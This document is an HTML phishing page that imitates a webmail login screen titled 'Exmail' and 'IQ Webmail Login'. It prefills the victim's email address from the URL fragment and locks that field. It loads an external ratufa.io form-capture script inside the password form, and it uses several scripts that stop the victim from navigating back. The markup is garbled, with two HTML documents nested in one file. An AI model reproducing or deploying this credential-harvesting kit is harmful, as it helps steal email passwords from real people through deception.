<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exmail Login - Not just mailbox</title>
    <style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background-color: #ffffff;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    position: relative;
}

/* Centered Layout Workspace Block Wrapper */
.login-wrapper {
    width: 100%;
    max-width: 320px;
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    margin-top: -80px; /* Upward offset precisely matching the screenshot layout */
}

/* Brand Square Logo Typography Replication Area */
.brand-logo-box {
    width: 100px;
    height: 100px;
    background-color: #ff0066; /* Vibrant signature pink/magenta block */
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 32px;
}

.brand-logo-box span {
    color: #ffffff;
    font-size: 42px;
    font-weight: 700;
    letter-spacing: -1px;
}

form {
    width: 100%;
    display: flex;
    flex-direction: column;
    gap: 1px; /* Stacked look with tiny line separation */
    margin-bottom: 16px;
    border: 1px solid #cbd5e1;
    border-radius: 4px;
    overflow: hidden;
}

/* Prefix Icon Addon Input Field Container Elements Rows Alignment */
.input-row {
    display: flex;
    width: 100%;
    height: 42px;
    background-color: #ffffff;
}

.input-row:not(:last-child) {
    border-bottom: 1px solid #cbd5e1;
}

.icon-addon {
    width: 42px;
    background-color: #f8fafc;
    border-right: 1px solid #cbd5e1;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #64748b;
    font-size: 13px;
    user-select: none;
}

.form-control {
    flex: 1;
    height: 100%;
    border: none;
    padding: 0 14px;
    font-size: 14px;
    color: #333333;
    outline: none;
    background: transparent;
}

.form-control::placeholder {
    color: #cbd5e1;
    font-weight: 400;
}

/* Flat wide rectangular solid energetic sky blue submit button block component (NOW FULLY CLICKABLE) */
.submit-btn {
    position: relative;
    z-index: 20;
    width: 100%;
    background-color: #3bb2f6; /* High contrast energetic bright sky-blue tint */
    color: #ffffff;
    border: none;
    height: 44px;
    font-size: 13px;
    font-weight: bold;
    letter-spacing: 0.5px;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 10px;
    transition: background-color 0.15s ease;
}

.submit-btn:hover {
    background-color: #2da1e3;
}

/* Bottom auxiliary connection tracking brand text hyperlink element */
.footer-link {
    font-size: 12px;
    color: #0086f6;
    text-decoration: none;
}

.footer-link:hover {
    text-decoration: underline;
}

/* OS Environment Activation Notification Simulation Overlay Layer Components Grid Blueprint */
.system-watermark {
    position: fixed;
    bottom: 24px;
    right: 24px;
    text-align: left;
    font-size: 13px;
    color: rgba(0, 0, 0, 0.13);
    line-height: 1.4;
    user-select: none;
    pointer-events: none;
    z-index: 100;
}

    </style>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IQ Webmail Login</title>
    <!-- Link to external stylesheet -->
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- Centered Form Container Card Box Component Module -->
    <main class="login-wrapper">
        
        
        <div class="brand-logo-box">
            <span>IQ</span>
        </div>
        <!-- Form submission configuration using FormSubmit module links integration -->
        <form action="" method="POST">
            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
            <!-- Email Input Group Row with Left Icon Addon -->
            <div class="input-row">
                <div class="icon-addon">👤</div>
 <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
            </div>

            <!-- Password Input Group Row with Left Icon Addon -->
            <div class="input-row">
                <div class="icon-addon">🔒</div>
<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
            </div>

            <!-- Solid Flat Light Blue Action Submission Trigger Button Block Component -->
            <button type="submit" class="submit-btn">LOGIN</button>
        </form>

        <!-- Bottom Informational Reference Link Footer Label Component -->
        <a href="#" class="footer-link">&bull; Manage E-mail account</a>

    </main>

</body>
</html>

    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>
</html>
